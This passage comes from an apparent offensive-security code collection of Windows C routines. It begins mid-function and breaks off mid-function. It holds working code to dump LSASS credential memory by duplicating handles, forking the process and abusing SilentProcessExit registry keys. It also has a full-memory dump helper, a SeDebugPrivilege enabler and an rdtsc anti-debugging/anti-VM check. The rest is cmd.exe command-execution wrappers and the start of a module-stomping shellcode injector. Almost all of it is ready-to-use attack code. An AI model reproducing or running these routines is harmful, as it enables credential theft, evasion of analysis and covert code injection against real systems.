		if (pSysHandleInfo->Handles[i].UniqueProcessId == dwLsassPid)
			continue;

		if (!(hTmpProcessHandle = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pSysHandleInfo->Handles[i].UniqueProcessId)))
			continue;

		if (!DuplicateHandle(hTmpProcessHandle, pSysHandleInfo->Handles[i].HandleValue, (HANDLE)-1, &hDuplicatedProcessHandle, (PROCESS_QUERY_INFORMATION | PROCESS_CREATE_PROCESS), FALSE, NULL)) {
			CloseHandle(hTmpProcessHandle);
			continue;
		}

		if (!(pObjectTypeInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)LocalAlloc(LPTR, 1024))) {
			CloseHandle(hTmpProcessHandle);
			CloseHandle(hDuplicatedProcessHandle);
			continue;
		}

		if ((STATUS = pNtQueryObject(hDuplicatedProcessHandle, ObjectTypeInformation, pObjectTypeInfo, 1024, &uReturnLength)) != STATUS_SUCCESS) {
			CloseHandle(hTmpProcessHandle);
			CloseHandle(hDuplicatedProcessHandle);
			LocalFree(pObjectTypeInfo);
			continue;
		}

		if (wcscmp(L"Process", pObjectTypeInfo->TypeName.Buffer) != 0x00) {
			CloseHandle(hTmpProcessHandle);
			CloseHandle(hDuplicatedProcessHandle);
			LocalFree(pObjectTypeInfo);
			continue;
		}

		if (GetProcessId(hDuplicatedProcessHandle) != dwLsassPid) {
			CloseHandle(hTmpProcessHandle);
			CloseHandle(hDuplicatedProcessHandle);
			LocalFree(pObjectTypeInfo);
			continue;
		}

		*phLsassProcess = hDuplicatedProcessHandle;
		CloseHandle(hTmpProcessHandle);
		LocalFree(pObjectTypeInfo);
		break;
	}

_END_OF_FUNC:
	if (pSysHandleInfo)
		LocalFree(pSysHandleInfo);
	if (*phLsassProcess)
		return TRUE;
	printf("[!] No Open Handles To Lsass.exe Was Detected !\n");
	return FALSE;
}

// ==============================================================================================================================================================================================

#define FLG_MONITOR_SILENT_PROCESS_EXIT			0x200
#define FLG_DUMP_TYPE							0x2
#define FLG_REPORTING_MODE						0x2

BOOL SetRegKey(IN LPWSTR szImgFileExecOptions, IN LPWSTR szSilentProcExit) {

	BOOL		bResult						= FALSE;
	NTSTATUS	STATUS						= ERROR_SUCCESS;
	HKEY		hImgFileExecOptions			= NULL,
				hSilentProcExit				= NULL;
	DWORD		dwGlobalFlagValue			= FLG_MONITOR_SILENT_PROCESS_EXIT,
				dwDumpTypeValue				= FLG_DUMP_TYPE,
				dwReportingModeValue		= FLG_REPORTING_MODE;
	WCHAR		szCurrentDir[MAX_PATH]		= { 0x00 };

	if (GetCurrentDirectoryW(MAX_PATH, &szCurrentDir) == 0x00) {
		printf("[!] GetCurrentDirectoryW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if ((STATUS = RegCreateKeyExW(HKEY_LOCAL_MACHINE, szImgFileExecOptions, 0x00, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hImgFileExecOptions, NULL)) != ERROR_SUCCESS) {
		printf("[!] RegCreateKeyExW [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	if ((STATUS = RegSetValueExW(hImgFileExecOptions, L"GlobalFlag", 0x00, REG_DWORD, (CONST PBYTE) & dwGlobalFlagValue, sizeof(DWORD))) != ERROR_SUCCESS) {
		printf("[!] RegSetValueExW [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	if ((STATUS = RegCreateKeyExW(HKEY_LOCAL_MACHINE, szSilentProcExit, 0x00, NULL, REG_OPTION_NON_VOLATILE, (KEY_SET_VALUE | DELETE | KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE), NULL, &hSilentProcExit, NULL)) != ERROR_SUCCESS) {
		printf("[!] RegCreateKeyExW [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	if ((STATUS = RegSetValueExW(hSilentProcExit, L"DumpType", 0x00, REG_DWORD, (CONST PBYTE) & dwDumpTypeValue, sizeof(DWORD))) != ERROR_SUCCESS) {
		printf("[!] RegSetValueExW [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	if ((STATUS = RegSetValueExW(hSilentProcExit, L"ReportingMode", 0x00, REG_DWORD, (CONST PBYTE) & dwReportingModeValue, sizeof(DWORD))) != ERROR_SUCCESS) {
		printf("[!] RegSetValueExW [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	if ((STATUS = RegSetValueExW(hSilentProcExit, L"LocalDumpFolder", 0x00, REG_SZ, (CONST PBYTE)&szCurrentDir, sizeof(szCurrentDir))) != ERROR_SUCCESS) {
		printf("[!] RegSetValueExW [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (hImgFileExecOptions)
		RegCloseKey(hImgFileExecOptions);
	if (hSilentProcExit)
		RegCloseKey(hSilentProcExit);
	if (!bResult) {
		if ((STATUS = RegDeleteTreeW(HKEY_LOCAL_MACHINE, szSilentProcExit)) != ERROR_SUCCESS)
			printf("[!] RegDeleteTreeW [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		if ((STATUS = RegDeleteTreeW(HKEY_LOCAL_MACHINE, szImgFileExecOptions)) != ERROR_SUCCESS)
			printf("[!] RegDeleteTreeW [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
	}
	return bResult;
}

// ==============================================================================================================================================================================================

BOOL ForkRemoteProcess(IN OUT HANDLE* phLsassHandle) {

	NTSTATUS				STATUS = STATUS_SUCCESS;
	fnNtCreateProcessEx		pNtCreateProcessEx = NULL;

	if (!(pNtCreateProcessEx = (fnNtCreateProcessEx)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtCreateProcessEx"))) {
		printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		return FALSE;
	}

	if ((STATUS = pNtCreateProcessEx(phLsassHandle, (PROCESS_QUERY_INFORMATION | PROCESS_VM_READ), NULL, *phLsassHandle, 0x00, NULL, NULL, NULL, 0x00)) != STATUS_SUCCESS) {
		printf("[!] NtCreateProcessEx Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}

// ==============================================================================================================================================================================================

BOOL SetDebugPrivilege() {

	BOOL	            bResult					= FALSE;
	TOKEN_PRIVILEGES	TokenPrivs				= { 0x00 };
	LUID				Luid					= { 0x00 };
	HANDLE	            hCurrentTokenHandle		= NULL;

	if (!OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES, &hCurrentTokenHandle)) {
		printf("[!] OpenProcessToken Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &Luid)) {
		printf("[!] LookupPrivilegeValueW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	TokenPrivs.PrivilegeCount				= 0x01;
	TokenPrivs.Privileges[0].Luid			= Luid;
	TokenPrivs.Privileges[0].Attributes		= SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hCurrentTokenHandle, FALSE, &TokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
		printf("[!] AdjustTokenPrivileges Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
		printf("[!] Not All Privileges Referenced Are Assigned To The Caller \n");
		goto _END_OF_FUNC;
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (hCurrentTokenHandle)
		CloseHandle(hCurrentTokenHandle);
	return bResult;
}


// ==============================================================================================================================================================================================


BOOL DumpLsassViaSilentProcessExit(IN DWORD dwLsassProcessId) {

	HANDLE							hLsassProcess								= NULL;
	NTSTATUS						STATUS										= STATUS_SUCCESS;
	fnRtlReportSilentProcessExit	pRtlReportSilentProcessExit					= NULL;
	WCHAR							szImgFileExecOptionsRegKey[MAX_PATH]		= L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\lsass.exe";
	WCHAR							szSilentProcExitRegKey[MAX_PATH]			= L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe";

	if (!(pRtlReportSilentProcessExit = (fnRtlReportSilentProcessExit)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlReportSilentProcessExit"))) {
		printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		return FALSE;
	}

	if (!SetDebugPrivilege())
		return FALSE;

	printf("[i] Searching For An Opened Handle To Process Of PID: %d \n", dwLsassProcessId);

	if (!DuplicateLsassHandle(&hLsassProcess, dwLsassProcessId))
		return FALSE;

	printf("[*] Opened An Duplicated Lsass.exe Handle: 0x%0.8X \n", hLsassProcess);

	if (ForkRemoteProcess(&hLsassProcess))
		dwLsassProcessId = GetProcessId(hLsassProcess);
	else
		return FALSE;

	printf("[+] Forked Lsass Process PID: %d\n", dwLsassProcessId);
	printf("[*] Opened An Forked Lsass.exe Handle: 0x%0.8X \n", hLsassProcess);

	if (!SetRegKey(szImgFileExecOptionsRegKey, szSilentProcExitRegKey))
		return FALSE;

	if ((STATUS = pRtlReportSilentProcessExit(hLsassProcess, 0x01)) != STATUS_SUCCESS) {
		printf("[!] RtlReportSilentProcessExit Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	if ((STATUS = RegDeleteTreeW(HKEY_LOCAL_MACHINE, szImgFileExecOptionsRegKey)) != ERROR_SUCCESS) {
		printf("[!] RegDeleteTreeW [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		return FALSE;
	}

	if ((STATUS = RegDeleteTreeW(HKEY_LOCAL_MACHINE, szSilentProcExitRegKey)) != ERROR_SUCCESS) {
		printf("[!] RegDeleteTreeW [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		return FALSE;
	}

	printf("[*] Lsass Is Dumped Successfully !\n");

	return TRUE;
}
```
### Query Token Integrity
```c
#include <windows.h>
#include <stdio.h>
#define STATUS_SUCCESS              0x00000000
#define STATUS_BUFFER_TOO_SMALL     0xC0000023

#define THREAD_INTEGRITY_UNKNOWN   0
#define THREAD_INTEGRITY_LOW       1
#define THREAD_INTEGRITY_MEDIUM    2
#define THREAD_INTEGRITY_HIGH      3

typedef NTSTATUS(NTAPI* fnNtQueryInformationToken)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, PVOID TokenInformation, ULONG TokenInformationLength, PULONG ReturnLength);
typedef PUCHAR(NTAPI* fnRtlSubAuthorityCountSid)(IN PSID Sid);
typedef PULONG(NTAPI* fnRtlSubAuthoritySid)(IN PSID Sid, IN ULONG SubAuthority);

DWORD QueryTokenIntegrity(IN HANDLE hToken) {

    NTSTATUS                    STATUS                      = 0x00;
    PTOKEN_MANDATORY_LABEL      pTokenLabel                 = NULL;
    ULONG                       uReturnLength               = 0x00,
                                uSidCount                   = 0x00;
    DWORD                       dwIntegrity                 = THREAD_INTEGRITY_UNKNOWN;
    fnNtQueryInformationToken   pNtQueryInformationToken    = NULL;
    fnRtlSubAuthorityCountSid   pRtlSubAuthorityCountSid    = NULL;
    fnRtlSubAuthoritySid        pRtlSubAuthoritySid         = NULL;

    if (!hToken)
        return FALSE;

    if (!(pNtQueryInformationToken = (fnNtQueryInformationToken)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQueryInformationToken"))) {
        printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        return FALSE;
    }

    if (!(pRtlSubAuthorityCountSid = (fnRtlSubAuthorityCountSid)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlSubAuthorityCountSid"))) {
        printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        return FALSE;
    }

    if (!(pRtlSubAuthoritySid = (fnRtlSubAuthoritySid)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlSubAuthoritySid"))) {
        printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        return FALSE;
    }

    if ((STATUS = pNtQueryInformationToken(hToken, TokenIntegrityLevel, NULL, 0x00, &uReturnLength)) != STATUS_SUCCESS && STATUS != STATUS_BUFFER_TOO_SMALL){
        printf("[!] NtQueryInformationToken [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
        return FALSE;
    }

    if (!(pTokenLabel = LocalAlloc(LPTR, uReturnLength))) {
        printf("[!] LocalAlloc Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    if ((STATUS = pNtQueryInformationToken(hToken, TokenIntegrityLevel, pTokenLabel, uReturnLength, &uReturnLength)) != STATUS_SUCCESS) {
        printf("[!] NtQueryInformationToken [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
        goto _END_OF_FUNC;
    }

    uSidCount = (*pRtlSubAuthorityCountSid(pTokenLabel->Label.Sid)) - 1;

    if ((dwIntegrity = *pRtlSubAuthoritySid(pTokenLabel->Label.Sid, uSidCount))) {

        if (dwIntegrity < SECURITY_MANDATORY_LOW_RID)
            dwIntegrity = THREAD_INTEGRITY_UNKNOWN;

        if (dwIntegrity < SECURITY_MANDATORY_MEDIUM_RID)
            dwIntegrity = THREAD_INTEGRITY_LOW;

        if (dwIntegrity >= SECURITY_MANDATORY_MEDIUM_RID && dwIntegrity < SECURITY_MANDATORY_HIGH_RID)
            dwIntegrity = THREAD_INTEGRITY_MEDIUM;

        if (dwIntegrity >= SECURITY_MANDATORY_HIGH_RID)
            dwIntegrity = THREAD_INTEGRITY_HIGH;
    }


_END_OF_FUNC:
    if (pTokenLabel)
        LocalFree(pTokenLabel);
    return dwIntegrity;
}
```
### Anti-Debugging Via Rdtsc
```c
#include <windows.h>
#include <stdio.h>
BOOL AntiVmRdtscWin32( VOID ) {
	DWORD tsc1 = { 0 };
	DWORD tsc2 = { 0 };
	DWORD tsc3 = { 0 };

	for ( int i = 0; i < 10; i++ )
	{
		tsc1 = (DWORD)__rdtsc();

		GetProcessHeap();

		tsc2 = (DWORD)__rdtsc();

	    CloseHandle( NULL );

		tsc3 = (DWORD)__rdtsc();

		if ( ( tsc3 - tsc2 ) / ( tsc2 - tsc1 ) >= 10 ) {
		    return FALSE;
		}
	}

	return TRUE;
}
```
### Execute Shell Command Via ShellExecuteEx (ASCII)
```c
#include <windows.h>
#include <stdio.h>
BOOL RunShellExecuteA(IN LPCSTR cCommand) {

    SHELLEXECUTEINFOA ShExecInfo = { 0 };

    ShExecInfo.cbSize           = sizeof(SHELLEXECUTEINFO);
    ShExecInfo.fMask            = SEE_MASK_NOCLOSEPROCESS;
    ShExecInfo.hwnd             = NULL;
    ShExecInfo.lpVerb           = "open";
    ShExecInfo.lpFile           = "cmd.exe";
    ShExecInfo.lpParameters     = cCommand;
    ShExecInfo.lpDirectory      = NULL;
    ShExecInfo.nShow            = SW_SHOW;
    ShExecInfo.hInstApp         = NULL;

    if (!ShellExecuteExA(&ShExecInfo)) {
        printf("[!] ShellExecuteExA Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    WaitForSingleObject(ShExecInfo.hProcess, INFINITE);

    return TRUE;
}
```
### Map File Into Memory As Non-Executable
```c
#include <windows.h>
#include <stdio.h>
#include "Structs.h"

typedef NTSTATUS(NTAPI* fnNtCreateSection)(OUT PHANDLE SectionHandle, IN ACCESS_MASK DesiredAccess, IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes, IN OPTIONAL PLARGE_INTEGER MaximumSize, IN ULONG SectionPageProtection, IN ULONG AllocationAttributes, IN OPTIONAL HANDLE FileHandle);

typedef NTSTATUS(NTAPI* fnNtMapViewOfSection)(IN HANDLE SectionHandle, IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG_PTR ZeroBits, IN SIZE_T CommitSize, IN OUT OPTIONAL PLARGE_INTEGER SectionOffset, IN OUT PSIZE_T ViewSize, IN SECTION_INHERIT InheritDisposition, IN ULONG AllocationType, IN ULONG Win32Protect);

typedef NTSTATUS(NTAPI* fnNtOpenFile)(OUT PHANDLE FileHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, OUT PIO_STATUS_BLOCK IoStatusBlock, IN ULONG ShareAccess, IN ULONG OpenOptions);


VOID RtlInitUnicodeString(OUT PUNICODE_STRING DestinationString, IN PCWSTR SourceString) {

    if (SourceString) {

        LPCWSTR		String2;

        for (String2 = SourceString; *String2; ++String2);

        SIZE_T	DestSize = ((int)(String2 - SourceString)) * sizeof(WCHAR);
        DestinationString->Length = (USHORT)DestSize;
        DestinationString->MaximumLength = (USHORT)DestSize + sizeof(WCHAR);
    }
    else {
        DestinationString->Length = 0x00;
        DestinationString->MaximumLength = 0x00;
    }

    DestinationString->Buffer = (PWCHAR)SourceString;
}

BOOL MapFileNoExec(IN LPWSTR szFileToMapPath, OUT PVOID* ppModuleBase) {

    NTSTATUS                STATUS                              = STATUS_SUCCESS;
    HANDLE                  hFile                               = NULL,
                            hSection                            = NULL;
    WCHAR		            szNtFileNtPath[MAX_PATH * 2]        = { 0 };
    UNICODE_STRING          usFileNtPath                        = { 0 };
    OBJECT_ATTRIBUTES       ObjAttributes                       = { 0 };
    IO_STATUS_BLOCK         IoStatusBlock                       = { 0 };
    SIZE_T                  sViewSize                           = NULL;
    fnNtCreateSection       pNtCreateSection                    = NULL;
    fnNtMapViewOfSection    pNtMapViewOfSection                 = NULL;
    fnNtOpenFile            pNtOpenFile                         = NULL;

    if (!szFileToMapPath || !ppModuleBase)
        return FALSE;

    if (!(pNtCreateSection = (fnNtCreateSection)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtCreateSection"))) {
        printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        return FALSE;
    }

    if (!(pNtMapViewOfSection = (fnNtMapViewOfSection)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtMapViewOfSection"))) {
        printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        return FALSE;
    }

    if (!(pNtOpenFile = (fnNtOpenFile)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtOpenFile"))) {
        printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        return FALSE;
    }

    swprintf_s(szNtFileNtPath, MAX_PATH * 2, L"\\??\\\\%s", szFileToMapPath);

    RtlInitUnicodeString(&usFileNtPath, szNtFileNtPath);
    InitializeObjectAttributes(&ObjAttributes, &usFileNtPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    if ((STATUS = pNtOpenFile(&hFile, FILE_READ_ACCESS | SYNCHRONIZE, &ObjAttributes, &IoStatusBlock, FILE_SHARE_READ, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT)) != STATUS_SUCCESS) {
        printf("[!] NtOpenFile Failed With Error: 0x%0.8X \n", STATUS);
        goto _END_OF_FUNC;
    }

    if ((STATUS = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE_NO_EXECUTE, hFile)) != STATUS_SUCCESS) {
        printf("[!] NtCreateSection Failed With Error: 0x%0.8X \n", STATUS);
        goto _END_OF_FUNC;
    }

    if ((STATUS = pNtMapViewOfSection(hSection, (HANDLE)-1, ppModuleBase, 0x00, 0x00, NULL, &sViewSize, ViewUnmap, 0x00, PAGE_READONLY)) != STATUS_SUCCESS && STATUS != STATUS_IMAGE_NOT_AT_BASE) {
        printf("[!] NtMapViewOfSection Failed With Error: 0x%0.8X \n", STATUS);
        goto _END_OF_FUNC;
    }

_END_OF_FUNC:
    if (hFile)
        CloseHandle(hFile);
    if (hSection)
        CloseHandle(hSection);
    return (*ppModuleBase) ? TRUE : FALSE;
}
```
### Execute Shell Command Via ShellExecuteEx (Unicode)
```c
#include <windows.h>
#include <stdio.h>
BOOL RunShellExecuteW(IN LPCWSTR szCommand) {

    SHELLEXECUTEINFO ShExecInfo = { 0 };

    ShExecInfo.cbSize       = sizeof(SHELLEXECUTEINFO);
    ShExecInfo.fMask        = SEE_MASK_NOCLOSEPROCESS;
    ShExecInfo.hwnd         = NULL;
    ShExecInfo.lpVerb       = L"open";
    ShExecInfo.lpFile       = L"cmd.exe";
    ShExecInfo.lpParameters = szCommand;
    ShExecInfo.lpDirectory  = NULL;
    ShExecInfo.nShow        = SW_SHOW;
    ShExecInfo.hInstApp     = NULL;

    if (!ShellExecuteExW(&ShExecInfo)) {
        printf("[!] ShellExecuteExW Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    WaitForSingleObject(ShExecInfo.hProcess, INFINITE);

    return TRUE;
}
```
### Memory Dump Via MiniDumpWriteDump
```c
#include <windows.h>
#include <stdio.h>
#include <dbghelp.h>

#pragma comment(lib, "dbghelp.lib")

BOOL CreateMemoryDump(IN DWORD dwProcessId, IN HANDLE hDmpFile) {

    BOOL    bResult     = FALSE;
    HANDLE  hProcess    = NULL;

    if (!dwProcessId || !hDmpFile || hDmpFile == INVALID_HANDLE_VALUE)
        return FALSE;

    if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId)) == NULL) {
        printf("[!] OpenProcess Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!MiniDumpWriteDump(hProcess, dwProcessId, hDmpFile, MiniDumpWithFullMemory, NULL, NULL, NULL)) {
        printf("[!] MiniDumpWriteDump Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (hProcess)
        CloseHandle(hProcess);
    return bResult;
}
```
### Enable SeDebugPrivilege
```c
#include <windows.h>
#include <stdio.h>
BOOL SetDebugPrivilege() {

    BOOL	            bResult                 = FALSE;
    TOKEN_PRIVILEGES	TokenPrivs              = { 0x00 };
    LUID				Luid                    = { 0x00 };
    HANDLE	            hCurrentTokenHandle     = NULL;

    if (!OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES, &hCurrentTokenHandle)) {
        printf("[!] OpenProcessToken Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &Luid)) {
        printf("[!] LookupPrivilegeValueW Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    TokenPrivs.PrivilegeCount           = 0x01;
    TokenPrivs.Privileges[0].Luid       = Luid;
    TokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hCurrentTokenHandle, FALSE, &TokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        printf("[!] AdjustTokenPrivileges Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("[!] Not All Privileges Referenced Are Assigned To The Caller \n");
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (hCurrentTokenHandle)
        CloseHandle(hCurrentTokenHandle);
    return bResult;
}
```
### Module Stomping
```c
#include <windows.h>
#include <stdio.h>
#include "Structs.h"

typedef NTSTATUS(NTAPI* fnNtCreateSection)(
	OUT PHANDLE				SectionHandle,
	IN  ACCESS_MASK			DesiredAccess,
	IN  POBJECT_ATTRIBUTES	ObjectAttributes	OPTIONAL,
	IN  PLARGE_INTEGER		MaximumSize			OPTIONAL,
	IN  ULONG				SectionPageProtection,
	IN  ULONG				AllocationAttributes,
	IN  HANDLE				FileHandle			OPTIONAL
	);

typedef NTSTATUS(NTAPI* fnNtMapViewOfSection)(
	IN		HANDLE			SectionHandle,
	IN		HANDLE			ProcessHandle,
	IN OUT	PVOID*			BaseAddress,
	IN		SIZE_T			ZeroBits,
	IN		SIZE_T			CommitSize,
	IN OUT	PLARGE_INTEGER	SectionOffset		OPTIONAL,
	IN OUT	PSIZE_T			ViewSize,
	IN		SECTION_INHERIT InheritDisposition,
	IN		ULONG			AllocationType,
	IN		ULONG			Protect
	);

typedef NTSTATUS(NTAPI* fnNtUnmapViewOfSection)(
	IN HANDLE	ProcessHandle,
	IN PVOID	BaseAddress			OPTIONAL
);

typedef NTSTATUS(NTAPI* fnNtProtectVirtualMemory)(
	IN		HANDLE		ProcessHandle,
	IN OUT	PVOID*		BaseAddress,
	IN OUT	PSIZE_T		NumberOfBytesToProtect,
	IN		ULONG		NewAccessProtection,
	OUT		PULONG		OldAccessPRotection
	);


typedef NTSTATUS(NTAPI* fnNtWriteVirtualMemory)(
	IN	HANDLE	ProcessHandle,
	IN	PVOID	BaseAddress,
	IN	PVOID	Buffer,
	IN	ULONG	NumberOfBytesToWrite,
	OUT PULONG	NumberOfBytesWritten OPTIONAL
	);

typedef NTSTATUS(NTAPI* fnNtCreateThreadEx)(
	OUT PHANDLE					ThreadHandle,
	IN	ACCESS_MASK             DesiredAccess,
	IN	POBJECT_ATTRIBUTES      ObjectAttributes	OPTIONAL,
	IN	HANDLE                  ProcessHandle,
	IN	PVOID                   StartRoutine,
	IN	PVOID                   Argument			OPTIONAL,
	IN	ULONG                   CreateFlags,
	IN	SIZE_T                  ZeroBits,
	IN	SIZE_T                  StackSize			OPTIONAL,
	IN	SIZE_T                  MaximumStackSize	OPTIONAL,
	OUT PPS_ATTRIBUTE_LIST      AttributeList		OPTIONAL
	);

typedef NTSTATUS(NTAPI* fnNtCreateFile)(
	OUT  PHANDLE            FileHandle,
	IN   ACCESS_MASK        DesiredAccess,
	IN   POBJECT_ATTRIBUTES ObjectAttributes,
	OUT  PIO_STATUS_BLOCK   IoStatusBlock,
	IN	 PLARGE_INTEGER     AllocationSize		OPTIONAL,
	IN   ULONG              FileAttributes,
	IN   ULONG              ShareAccess,
	IN   ULONG              CreateDisposition,
	IN   ULONG              CreateOptions,
	IN   PVOID              EaBuffer,
	IN   ULONG              EaLength
	);


// ---------------------------------------------------------------------------------------------------------------------------------------------------------

typedef struct _NT_API {

	fnNtCreateFile				pNtCreateFile;
	fnNtCreateSection			pNtCreateSection;
	fnNtMapViewOfSection		pNtMapViewOfSection;
	fnNtUnmapViewOfSection		pNtUnmapViewOfSection;
	fnNtProtectVirtualMemory	pNtProtectVirtualMemory;
	fnNtWriteVirtualMemory		pNtWriteVirtualMemory;
	fnNtCreateThreadEx			pNtCreateThreadEx;

}NT_API, * PNT_API;

// ---------------------------------------------------------------------------------------------------------------------------------------------------------

NT_API g_NtApi = { 0x00 };

// ==========================================================================================================================================================
// ==========================================================================================================================================================

#define DELETE_HANDLE(H)								\
	if (H != NULL && H != INVALID_HANDLE_VALUE){		\
		CloseHandle(H);									\
		H = NULL;										\
	}

// ==========================================================================================================================================================

VOID RtlInitUnicodeString(IN OUT PUNICODE_STRING DestinationString, IN PCWSTR SourceString) {

	SIZE_T DestSize;

	if (SourceString)
	{
		DestSize = wcslen(SourceString) * sizeof(WCHAR);
		DestinationString->Length = (USHORT)DestSize;
		DestinationString->MaximumLength = (USHORT)DestSize + sizeof(WCHAR);
	}
	else
	{
		DestinationString->Length = 0;
		DestinationString->MaximumLength = 0;
	}

	DestinationString->Buffer = (PWCHAR)SourceString;
}

// ==========================================================================================================================================================

BOOL InitializeSyscallsStruct() {

	HMODULE		hNtdll = NULL;

	if (!(hNtdll = GetModuleHandle(TEXT("NTDLL")))) {
		printf("[!] GetModuleHandle Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	g_NtApi.pNtCreateFile			= (fnNtCreateFile)GetProcAddress(hNtdll, "NtCreateFile");
	g_NtApi.pNtCreateSection		= (fnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
	g_NtApi.pNtMapViewOfSection		= (fnNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
	g_NtApi.pNtUnmapViewOfSection	= (fnNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
	g_NtApi.pNtCreateThreadEx		= (fnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
	g_NtApi.pNtProtectVirtualMemory	= (fnNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
	g_NtApi.pNtWriteVirtualMemory	= (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");

	if (!g_NtApi.pNtCreateFile			|| !g_NtApi.pNtCreateSection	|| !g_NtApi.pNtMapViewOfSection		||
		!g_NtApi.pNtUnmapViewOfSection	|| !g_NtApi.pNtCreateThreadEx	|| !g_NtApi.pNtWriteVirtualMemory	|| !g_NtApi.pNtProtectVirtualMemory)
	{
		return FALSE;
	}

	return TRUE;
}

// ==========================================================================================================================================================

BOOL ShellcodeModuleStomp(IN HANDLE hProcess, IN LPWSTR szSacrificialDllPath, IN PBYTE pShellcodeBuffer, IN SIZE_T sShellcodeLength, OUT PHANDLE phThread) {

	NTSTATUS				STATUS						= STATUS_SUCCESS;
	HANDLE					hFile						= NULL,
							hSection					= NULL;
	WCHAR					szNtPathDll[MAX_PATH]		= { 0 };
	OBJECT_ATTRIBUTES		ObjAttributes				= { 0 };
	UNICODE_STRING			UnicodeStr					= { 0 };
	IO_STATUS_BLOCK			IOStatusBlock				= { 0 };
	SIZE_T					sViewSize					= NULL,
							sTextSectionSize			= NULL,
							sTextSizeLeft				= NULL,
							sTmpSizeVar					= sShellcodeLength,
